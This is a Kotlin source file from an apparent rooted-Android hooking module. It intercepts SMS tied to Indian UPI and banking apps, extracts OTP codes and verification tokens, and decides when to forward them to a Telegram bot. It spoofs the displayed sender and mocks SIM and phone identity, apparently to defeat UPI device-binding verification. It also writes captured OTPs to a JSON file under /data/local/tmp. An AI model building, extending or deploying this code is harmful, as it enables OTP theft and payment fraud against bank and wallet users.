package com.hivirtus.zygiskmode

import android.content.Context
import org.json.JSONObject
import java.util.regex.Pattern

object SmsMatcher {

    private val OTP_PATTERN = Pattern.compile("""\b(\d{4,8})\b""")
    private val PLACEHOLDER_SENDER = "AD-TEST-S"

    fun enabledHookedApps(config: ModuleConfig): List<UpiAppRegistry.UpiApp> =
        UpiAppRegistry.enabledAppsFromConfig(config.hookedUpiApps)

    fun userSenderId(config: ModuleConfig): String? {
        val id = config.injectSenderId.trim()
        if (id.isBlank()) return null
        if (id.equals(PLACEHOLDER_SENDER, ignoreCase = true)) return null
        return id
    }

    fun matchedHookedApp(config: ModuleConfig, peer: String, body: String): UpiAppRegistry.UpiApp? {
        val hooked = enabledHookedApps(config)
        if (hooked.isEmpty()) return null
        return UpiAppRegistry.matchAmong(hooked, peer, body)
    }

    fun shouldCaptureIncoming(config: ModuleConfig, sender: String, body: String): Boolean {
        if (!config.hookIncomingSms && !config.hookUpiVerification) return false
        return shouldInterceptIncoming(config, sender, body)
    }

    fun shouldCaptureOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
        if (!config.hookOutgoingSms) return false
        return shouldInterceptOutgoing(config, recipient, body)
    }

    fun shouldForwardToTelegram(config: ModuleConfig, peer: String, body: String, direction: String): Boolean {
        if (!config.autoForwardToken) return false
        if (config.telegramBotToken.isBlank() || config.telegramChatId.isBlank()) return false
        return when (direction) {
            "outgoing" -> shouldInterceptOutgoing(config, peer, body)
            else -> shouldInterceptIncoming(config, peer, body)
        }
    }

    /**
     * Sirf hooked app ka SMS — YesPay/Snapmint generic match nahi.
     * YESPRO tabhi jab YesPay hook ON ho. Snapmint tabhi jab Snapmint hook ON ho.
     */
    fun shouldInterceptIncoming(config: ModuleConfig, peer: String, body: String): Boolean {
        if (body.isBlank()) return false
        if (!config.hookIncomingSms) return false
        val hooked = enabledHookedApps(config)
        if (hooked.isNotEmpty()) {
            if (matchedHookedApp(config, peer, body) != null) return true
        }
        if (extractOtpDigits(body) != null) return true
        return body.length >= 4
    }

    private val outgoingVerifyKeywords = listOf(
        "YESPRO", "YESPROUPI", "YESPAY", "YESBNK", "UPI", "VERIFY", "VK-", "OTP",
        "PHONEPE", "PAYTM", "GPAY", "SNAPMINT", "KREDIT", "MEDIBUDDY", "VIGINI", "MEDIB",
        "HEROAXISUPI", "HEROAXIS", "HEROFIN", "HEROFINCORP", "GROWW", "AXIS", "HDFC",
        "PAYZAPP", "STASHFIN", "TATANEU", "FLIPKART", "FKARTUPI", "SUPERYES", "DO NOT COPY"
    )

    fun shouldInterceptOutgoing(config: ModuleConfig, recipient: String, body: String): Boolean {
        if (!config.hookOutgoingSms && !config.interceptFakeSuccess) return false
        if (body.isBlank()) return false
        val spoofActive = config.enableVirtualSim || config.enablePhoneSpoof || config.enableSim1Mock ||
            config.mockPhoneSim1.isNotBlank()
        if (enabledHookedApps(config).isEmpty() && !spoofActive) return false
        if (recipient.isNotBlank() && matchedHookedApp(config, recipient, body) != null) return true
        val upper = body.uppercase()
        if (outgoingVerifyKeywords.any { upper.contains(it) }) return true
        if (spoofActive && recipient.isNotBlank() && isShortCodeRecipient(recipient)) return true
        return recipient.isNotBlank() && isShortCodeRecipient(recipient)
    }

    fun interceptDisplay(config: ModuleConfig, actualPeer: String, configManager: ConfigManager): String {
        userSenderId(config)?.let { return it }
        if (!config.overrideIncomingSender) return actualPeer.trim()
        if (isIndianMobileNumber(actualPeer) || isNumericSender(actualPeer)) {
            return configManager.readSpoofPhone().ifBlank { config.mockPhoneSim1 }.ifBlank { "INTERCEPT" }
        }
        return actualPeer.trim()
    }

    fun isIndianMobileNumber(sender: String): Boolean {
        val digits = sender.replace("\\D".toRegex(), "")
        if (digits.length == 10) return true
        if (digits.length == 12 && digits.startsWith("91")) return true
        if (digits.length == 11 && digits.startsWith("0")) return true
        return false
    }

    fun isCarrierSenderId(sender: String): Boolean {
        val s = sender.trim()
        if (s.isBlank() || isIndianMobileNumber(s) || isNumericSender(s)) return false
        return s.any { it.isLetter() }
    }

    fun isNumericSender(sender: String): Boolean {
        val digits = sender.replace("\\D".toRegex(), "")
        return digits.length >= 8 && !sender.any { it.isLetter() }
    }

    fun isShortCodeRecipient(recipient: String): Boolean {
        val digits = recipient.replace("\\D".toRegex(), "")
        return digits.length in 4..10
    }

    fun extractOtpDigits(body: String): String? {
        val matcher = OTP_PATTERN.matcher(body)
        if (matcher.find()) {
            val digits = matcher.group(1) ?: return null
            if (digits.length in 4..8) return digits
        }
        val trimmed = body.trim()
        if (trimmed.length in 4..8 && trimmed.all { it.isDigit() }) return trimmed
        return null
    }

    fun extractToken(body: String, autoExtract: Boolean): String {
        val trimmed = body.trim()
        if (trimmed.isEmpty()) return ""
        if (isEncryptedToken(trimmed)) return trimmed
        if (!autoExtract) return trimmed
        return extractOtpDigits(trimmed) ?: trimmed
    }

    fun isEncryptedToken(text: String): Boolean {
        if (text.length < 24) return false
        val compact = text.replace("\\s".toRegex(), "")
        if (compact.length < 20) return false
        val tokenChars = compact.count { it.isLetterOrDigit() || it in "+/=)(?&._-" }
        return tokenChars >= compact.length * 0.85
    }
}

object OtpCaptureWriter {

    fun write(context: Context, otp: LastOtp) {
        val capturedAt = if (otp.capturedAt > 0L) otp.capturedAt else System.currentTimeMillis()
        val json = JSONObject().apply {
            put("otp", otp.otp)
            put("sender", otp.sender)
            put("body", otp.body)
            put("direction", otp.direction)
            put("phone", otp.phone)
            put("raw_peer", otp.rawPeer)
            put("message_label", otp.messageLabel)
            put("captured_at", capturedAt)
        }
        val payload = json.toString()
        val appDir = context.getExternalFilesDir(null) ?: context.filesDir

        try {
            appDir.mkdirs()
            java.io.File(appDir, ConfigManager.APP_OTP_NAME).writeText(payload)
        } catch (_: Exception) {}

        try {
            java.io.File("/data/local/tmp/hivirtus_last_otp.json").writeText(payload)
        } catch (_: Exception) {}
    }
}
